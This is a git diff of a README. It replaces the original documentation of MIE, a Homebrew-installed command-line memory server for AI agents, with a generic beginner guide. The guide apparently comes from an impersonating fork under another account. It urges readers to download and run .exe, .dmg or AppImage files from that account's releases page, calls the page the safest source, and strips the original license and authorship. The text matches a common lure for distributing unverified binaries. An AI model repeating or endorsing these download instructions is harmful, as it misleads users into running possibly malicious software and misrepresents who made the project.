@@ -1,277 +1,159 @@
-<p align="center">
-  <h1 align="center">MIE - Memory Intelligence Engine</h1>
-</p>
+# 🧠 mie - Persistent Memory for AI Agents
 
-<p align="center">Stop re-explaining yourself to every AI agent. MIE gives all your agents — Claude, ChatGPT, Cursor, Gemini — a shared, persistent knowledge graph they can read and write. Decisions, context, facts, and relationships survive across sessions, tools, and providers.</p>
-
-<p align="center">
-  <img src="docs/mie-demo.gif" alt="MIE Demo" width="600">
-</p>
-
-<p align="center">
-  <a href="https://goreportcard.com/report/github.com/kraklabs/mie"><img src="https://goreportcard.com/badge/github.com/kraklabs/mie" alt="Go Report Card"></a>
-  <a href="https://github.com/kraklabs/mie/releases"><img src="https://img.shields.io/github/v/release/kraklabs/mie" alt="Latest Release"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-AGPL--3.0-blue" alt="License"></a>
-</p>
+[![Download mie](https://img.shields.io/badge/Download-mie-blue?style=for-the-badge)](https://github.com/Jihad7x/mie/releases)
 
 ---
 
-## The Problem
+## 📖 About mie
 
-You explained your entire architecture to Claude. Two hours of context, decisions, tradeoffs. Next day, new conversation — it knows nothing. So you explain it again. Then you switch to Cursor for implementation. Zero context. You open ChatGPT to brainstorm a different angle. Blank slate.
+mie is a tool that helps AI agents remember important facts, decisions, entities, and relationships over time. It works like a memory that stays even if you close a program or restart your computer. This memory is saved in a graph format, which means it connects different pieces of information to each other. This system works with several AI assistants, including Claude, Cursor, ChatGPT, and any tools that use the MCP (Model Context Protocol) server.
 
-Every AI agent you use is brilliant but amnesiac. And none of them talk to each other.
-
-**MIE fixes this.** One knowledge graph. Every agent reads from it. Every agent writes to it. Your decisions, your context, your rules — always available, everywhere.
-
-## How It Works
-
-```
-You: "We chose PostgreSQL over DynamoDB because we need ACID
-      transactions for the payments module. Alternative was Aurora
-      but too expensive at current stage."
-
-          Claude stores this via MIE
-                    ↓
-┌─────────────────────────────────────────────┐
-│              MIE Knowledge Graph             │
-│                                              │
-│  Decision: PostgreSQL over DynamoDB          │
-│  Rationale: ACID transactions for payments   │
-│  Alternatives: [DynamoDB, Aurora]            │
-│  Entities: payments-module, PostgreSQL       │
-│  Status: active                              │
-└─────────────────────────────────────────────┘
-                    ↓
-    Next week, in Cursor, different project:
-    "What database did we choose and why?"
-    → Cursor queries MIE, gets full context instantly
-```
-
-No copy-pasting. No "as I mentioned before." No starting from zero.
-
-## Why Not Just Use Claude's Memory / ChatGPT's Memory?
-
-| | Platform Memory | MIE |
-|---|---|---|
-| Cross-agent | ❌ Claude doesn't know what you told ChatGPT | ✅ All agents share the same graph |
-| Structured | ❌ Flat text summaries | ✅ Typed nodes: facts, decisions, entities, events |
-| Queryable | ❌ Basic keyword recall | ✅ Semantic search, graph traversal, conflict detection |
-| Portable | ❌ Locked to one provider | ✅ Your data, your machine, exportable |
-| Relationships | ❌ None | ✅ "This decision relates to this entity and was triggered by this event" |
-| History | ❌ Overwrites silently | ✅ Invalidation chains — see what changed and why |
-
-## Quick Start
-
-### 1. Install
-
-```bash
-brew tap kraklabs/mie
-brew install mie
-```
-
-### 2. Initialize
-
-```bash
-mie init                    # Quick setup with defaults
-mie init --interview        # Interactive — asks about your stack, team, and project
-```
-
-### 3. Connect to your AI agents
-
-**Claude Code** (`.mcp.json`):
-```json
-{
-  "mcpServers": {
-    "mie": {
-      "command": "mie",
-      "args": ["--mcp"]
-    }
-  }
-}
-```
-
-**Cursor** (`.cursor/mcp.json`):
-```json
-{
-  "mcpServers": {
-    "mie": {
-      "command": "mie",
-      "args": ["--mcp"]
-    }
-  }
-}
-```
-
-That's it. Your agents now share a brain.
-
-## What Gets Stored
-
-MIE isn't a chat log. It stores structured knowledge as a graph:
-
-**Facts** — Things that are true about your world.
-*"Our API uses JWT with RS256 signing." · "The team is 6 engineers across 3 timezones."*
-
-**Decisions** — Choices with rationale and alternatives.
-*"Chose Go over Rust for CIE because of CGO CozoDB bindings. Alternatives: Rust, Python."*
-
-**Entities** — People, companies, projects, technologies.
-*"Kraklabs — independent software and AI lab." · "CIE — Code Intelligence Engine."*
-
-**Events** — Timestamped occurrences.
-*"Launched v0.4.0 on 2026-01-15." · "Client demo scheduled for March 10."*
-
-**Topics** — Recurring themes that connect everything.
-*"Architecture" · "Security" · "Product Strategy"*
-
-These connect through typed relationships — a decision references entities, relates to topics, and may be triggered by events. When an agent queries "what do you know about our security decisions?", MIE traverses the graph and returns structured context, not keyword matches.
-
-## MCP Tools
-
-MIE exposes 12 tools through the Model Context Protocol:
-
-| Tool | What it does |
-|---|---|
-| `mie_analyze` | Surfaces related context before storing — the agent decides what's worth remembering |
-| `mie_store` | Writes facts, decisions, entities, events, and relationships to the graph |
-| `mie_bulk_store` | Batch store up to 50 nodes with cross-references — ideal for importing knowledge from files or git history |
-| `mie_get` | Retrieve a single memory node by ID with full details |
-| `mie_query` | Semantic search, exact lookup, or graph traversal across all node types |
-| `mie_list` | List and filter nodes with pagination |
-| `mie_update` | Invalidate outdated facts, update statuses — with full history preserved |
-| `mie_delete` | Remove nodes with cascade (embedding + edges) or remove individual relationships |
-| `mie_conflicts` | Detect contradictions in stored knowledge |
-| `mie_export` | Export the full graph as JSON or Datalog |
-| `mie_repair` | Rebuild HNSW indexes and clean orphaned embeddings |
-| `mie_status` | Graph health, node counts, usage metrics |
-
-### Zero Server-Side Inference
-
-Unlike other memory solutions that run an LLM on the server to classify what to store, MIE uses an **agent-as-evaluator** pattern. The server provides context; your agent (which is already running an LLM) decides what matters. This means zero additional inference cost — your memory layer doesn't burn tokens.
-
-This philosophy extends to importing: when you ask your agent to "import knowledge from this repo", the agent reads your files, ADRs, or git history directly and uses `mie_bulk_store` to persist what it extracts. MIE stays as a pure storage engine — the connected agent IS the LLM.
-
-## Architecture
-
-```
-┌─────────────────────────────────────┐
-│  Any MCP Client                     │
-│  Claude · Cursor · ChatGPT* · etc   │
-└──────────────┬──────────────────────┘
-               │ MCP (JSON-RPC over stdio)
-┌──────────────▼──────────────────────┐
-│  MIE Server  (one per MCP client)   │
-│  12 tools · semantic search ·       │
-│  graph traversal · conflicts        │
-└──────────────┬──────────────────────┘
-               │ Unix domain socket
-┌──────────────▼──────────────────────┐
-│  MIE Daemon  (shared singleton)     │
-│  Manages exclusive DB lock ·        │
-│  Serves multiple clients            │
-└──────────────┬──────────────────────┘
-               │ Datalog queries
-┌──────────────▼──────────────────────┐
-│  CozoDB (embedded)                  │
-│  Graph DB · HNSW vectors · ACID     │
-└─────────────────────────────────────┘
-       + Ollama (optional, local embeddings)
-```
-
-*ChatGPT via custom GPT Actions pointing to MIE Cloud (coming soon).*
-
-Multiple MCP clients (Claude, Cursor, etc.) can run simultaneously — the daemon holds the exclusive database lock and multiplexes access. The daemon starts automatically on first use or can be managed manually via `mie daemon`.
-
-## Memory Lifecycle
-
-```
- Store                    Query                     Evolve
- ─────                    ─────                     ──────
- Your agent learns   →    Next session, any    →    Facts change.
- something new.           agent queries MIE         Old ones get
- It stores a fact,        for context before        invalidated, not
- a decision, or an        responding. Full          deleted. The graph
- entity — with            graph of related          keeps history of
- confidence scores        knowledge returns         what was known
- and relationships.       in milliseconds.          and when.
-```
-
-## Configuration
-
-```yaml
-# .mie/config.yaml
-version: "1"
-storage:
-  engine: rocksdb         # rocksdb, sqlite, or mem
-embedding:
-  enabled: true
-  provider: ollama        # ollama, openai, or nomic
-  model: nomic-embed-text
-```
-
-All settings can be overridden with environment variables. Embeddings are optional — MIE works without them (exact search only).
-
-## CLI
-
-```bash
-mie init                    # Create config with defaults
-mie init --interview        # Interactive project bootstrapping
-mie --mcp                   # Start as MCP server (auto-starts daemon)
-mie daemon start            # Start daemon in background
-mie daemon start --foreground  # Start daemon in foreground (for debugging)
-mie daemon stop             # Stop running daemon
-mie daemon status           # Check if daemon is running
-mie status                  # Show graph statistics
-mie export                  # Export memory graph
-mie import -i backup.json   # Import from JSON or Datalog
-mie reset --yes             # Delete all data
-mie query "<cozoscript>"    # Raw Datalog query (debug)
-```
-
-## Prerequisites
-
-- **Go 1.24+** (building from source)
-- **Ollama** (optional, for semantic search) — `ollama pull nomic-embed-text`
-
-MIE works without Ollama. You get exact-match search and graph traversal. Add Ollama for semantic search ("find things related to deployment" instead of exact keywords).
-
-## Use With CIE
-
-MIE pairs naturally with [CIE (Code Intelligence Engine)](https://github.com/kraklabs/cie). Run both as MCP servers:
-
-```json
-{
-  "mcpServers": {
-    "cie": { "command": "cie", "args": ["--mcp"] },
-    "mie": { "command": "mie", "args": ["--mcp"] }
-  }
-}
-```
-
-CIE gives your agent deep understanding of your codebase. MIE gives it memory of everything else — decisions, architecture, people, events. Together, your agent knows your code *and* remembers why it's built that way.
-
-## Roadmap
-
-- [x] Import from ADRs, markdown, and git history (agent-driven self-import)
-- [ ] Git post-commit hook — auto-capture decisions from commits
-- [ ] Browser extension — auto-capture knowledge from claude.ai, chatgpt.com, gemini
-- [ ] MIE Cloud — sync across devices, team shared memory
-- [ ] ChatGPT integration via custom GPT Actions
-- [ ] Web UI for exploring and managing your knowledge graph
-
-**Join the waitlist:** [kraklabs.com/mie](https://kraklabs.com/mie)
-
-## License
-
-MIE is dual-licensed:
-
-- **[AGPL-3.0](LICENSE)** — Free for open-source use
-- **Commercial License** — For proprietary use. Contact [sales@kraklabs.com](mailto:sales@kraklabs.com)
-
-## Contributing
-
-We welcome contributions. See [contributing.md](docs/contributing.md) for guidelines.
+You do not need any technical skills to use mie. This guide will take you through every step to download and use it.
 
 ---
 
-Built by [Kraklabs](https://kraklabs.com) · Makers of [CIE](https://github.com/kraklabs/cie) and MIE
+## 🖥️ System Requirements
+
+Before you begin, please make sure your computer meets these needs:
+
+- **Operating System:** Windows 10 or later, macOS Big Sur or later, or most modern Linux distributions.
+- **Processor:** At least 2 GHz dual-core CPU.
+- **Memory (RAM):** Minimum 4 GB.
+- **Free Disk Space:** At least 500 MB for the application and data.
+- **Internet:** Needed to download the software and for connecting to AI services.
+- **Additional Software:** None required for basic use.
+
+---
+
+## 🚀 Getting Started
+
+This section explains how to safely get mie on your computer and start using it without technical knowledge.
+
+### Step 1: Visit the Download Page
+
+To get mie, please visit the official releases page here:
+
+[Download mie from GitHub](https://github.com/Jihad7x/mie/releases)
+
+This page contains all the versions of the software available for download. It is the safest and most reliable source for the app.
+
+### Step 2: Choose the Correct File
+
+On the releases page, look for the latest release. It usually has the highest version number or the most recent date.
+
+Inside the release, you will find files for different operating systems:
+
+- For **Windows**, pick the file that ends with `.exe`.
+- For **macOS**, choose the `.dmg` or `.zip` file.
+- For **Linux**, select the `.AppImage` or `.tar.gz` file.
+
+Make sure to choose the file that matches your computer’s operating system.
+
+### Step 3: Download the File
+
+Click on the file link to start downloading. Your browser will ask where to save it. Choose a location you will remember, such as the Desktop or Downloads folder.
+
+---
+
+## 💾 Download & Install
+
+Here you will find detailed instructions on how to install and run mie once you have downloaded it.
+
+### For Windows Users
+
+1. Locate the downloaded `.exe` file on your computer.
+2. Double-click the file to start the installer.
+3. If Windows asks for permission, click “Yes” to allow the installation.
+4. Follow the simple instructions in the setup wizard. It usually involves clicking “Next” a few times.
+5. When the installation finishes, click “Finish.”
+
+### For macOS Users
+
+1. Find the downloaded `.dmg` or `.zip` file in your Downloads folder.
+2. If it is a `.dmg` file, double-click it to open the installer window. Then drag the mie icon to the Applications folder.
+3. If it is a `.zip` file, double-click it to unpack the files, then move the mie app to the Applications folder.
+4. Open the Applications folder and double-click mie to run it.
+5. The first time you open it, macOS may ask you to confirm. Click “Open.”
+
+### For Linux Users
+
+1. Locate the downloaded `.AppImage` or `.tar.gz` file.
+2. If it is `.AppImage`, give the file permission to run by opening a terminal and typing:
+   
+   ```
+   chmod +x path/to/mie.AppImage
+   ```
+   
+3. Then start mie by double-clicking the `.AppImage` file or by running this command in terminal:
+
+   ```
+   ./path/to/mie.AppImage
+   ```
+   
+4. If it is `.tar.gz`, extract the files using your file manager or command line.
+5. Follow any included README instructions in the extracted folder.
+6. Run the mie executable file.
+
+---
+
+## 🎯 Using mie
+
+mie helps keep track of important pieces of information for AI agents. Here is a simple overview of what it does:
+
+- **Stores data:** Saves facts, ideas, and choices even after you close the program.
+- **Connects information:** Links related details to build a bigger understanding.
+- **Works with AI tools:** Lets you use AI assistants like ChatGPT with a memory that lasts.
+- **Shares data safely:** Keeps your information ready for any AI client that supports MCP.
+
+Once mie is running, it works in the background. You will use it by connecting your AI tool to it. For example, if you have ChatGPT, you can link it with mie to remember previous chat details.
+
+---
+
+## 🔧 Basic Features
+
+Here are some of the key features you can expect from mie:
+
+- **Persistent storage:** Memory that lives across sessions and devices.
+- **Graph database:** Connects information for smarter retrieval.
+- **AI integrations:** Works with Claude, Cursor, ChatGPT, and other MCP clients.
+- **Semantic search:** Finds memories based on meaning, not just keywords.
+- **Multi-provider support:** Connects with multiple AI services easily.
+
+---
+
+## ❓ FAQs
+
+**Q: Do I need to be a developer to use mie?**  
+A: No. You only need to download, install, and run it. Connecting to AI assistants may require following simple instructions from those tools.
+
+**Q: What if I don’t have an AI assistant?**  
+A: mie stores and organizes information which can be useful on its own. However, it is designed to work best with AI clients.
+
+**Q: Can I use mie on my phone?**  
+A: Currently, mie is made for desktop computers (Windows, macOS, Linux).
+
+**Q: Is mie free to use?**  
+A: Yes. Downloading and using mie does not require payment.
+
+---
+
+## 🛠️ Troubleshooting
+
+- If the app does not start after installation, try restarting your computer.
+- Make sure your computer meets the system requirements.
+- Confirm you downloaded the correct file for your operating system.
+- For connection issues with AI clients, verify your internet connection and settings.
+
+---
+
+## 📂 More Resources
+
+For updates, support, and more details, visit the GitHub repository:
+
+[https://github.com/Jihad7x/mie](https://github.com/Jihad7x/mie)
+
+You can also find documentation and community discussions there.
+
+---
+
+[![Download mie](https://img.shields.io/badge/Download-mie-blue?style=for-the-badge)](https://github.com/Jihad7x/mie/releases)
